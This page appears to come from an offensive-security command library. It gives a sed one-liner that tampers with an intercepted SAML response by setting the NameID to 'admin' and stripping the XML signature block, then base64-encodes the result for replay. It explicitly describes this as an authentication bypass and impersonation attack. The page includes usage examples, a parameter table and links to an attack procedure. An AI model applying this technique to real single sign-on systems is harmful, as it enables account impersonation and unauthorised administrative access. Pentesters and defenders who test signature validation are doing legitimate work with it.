---
type: command
executor: bash
data: >-
  sed -i 's|<NameID>.*</NameID>|<NameID>admin</NameID>|g;
  /<ds:Signature>/,/</ds:Signature>/d' $_XML_FILE && echo "$(base64 -w 0
  $_XML_FILE)" > $_OUTPUT_FILE
tags:
  - saml
  - injection
  - xml-modification
platforms:
  - Linux
  - macOS
verified: true
validated: true
---

# sed-modify-saml-response-for-injection

## Command

```bash
sed -i 's|<NameID>.*</NameID>|<NameID>admin</NameID>|g; /<ds:Signature>/,/</ds:Signature>/d' $_XML_FILE && echo "$(base64 -w 0 $_XML_FILE)" > $_OUTPUT_FILE
```

## Description

This command modifies a SAML XML file by replacing the NameID element with 'admin' for impersonation and removing the digital signature block to evade verification. It then re-encodes the XML to base64 for use in HTTP requests. Use this after decoding an intercepted SAMLResponse in an authentication bypass attack.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| $_XML_FILE | Path to the decoded SAML XML file | Yes |
| $_OUTPUT_FILE | Path for the base64-encoded output file | Yes |
| -i | Edit file in place | Built-in |
| s|<NameID>.*</NameID>|<NameID>admin</NameID>|g | Sed substitution to change NameID (global) | Built-in |
| /<ds:Signature>/,/</ds:Signature>/d | Sed delete range for signature block | Built-in |
| base64 -w 0 | Encode without line wraps | Built-in |

## Examples

### Basic Usage

```bash
sed -i 's|<NameID>.*</NameID>|<NameID>admin</NameID>|g; /<ds:Signature>/,/</ds:Signature>/d' saml.xml && echo "$(base64 -w 0 saml.xml)" > modified.txt
```

### Advanced Usage

For more complex XML, combine with xmlstarlet for validation:

```bash
sed -i 's|<NameID>.*</NameID>|<NameID>admin</NameID>|g; /<ds:Signature>/,/</ds:Signature>/d' $_XML_FILE && xmllint --format $_XML_FILE && echo "$(base64 -w 0 $_XML_FILE)" > $_OUTPUT_FILE
```

## Expected Output

Modified XML file (viewable with cat or xmllint) showing <NameID>admin</NameID> and no <ds:Signature> block. Output file contains base64 string, e.g., 'PHNhbWw6QXNzZXJ0aW9uIHh...==' representing the tampered response.

## Related

- [[procedures/SAML-Injection-for-Authentication-Bypass-and-Signature-Stripping-with-Admin-NameID]]
- [[tools/Burp-Suite]] for interception
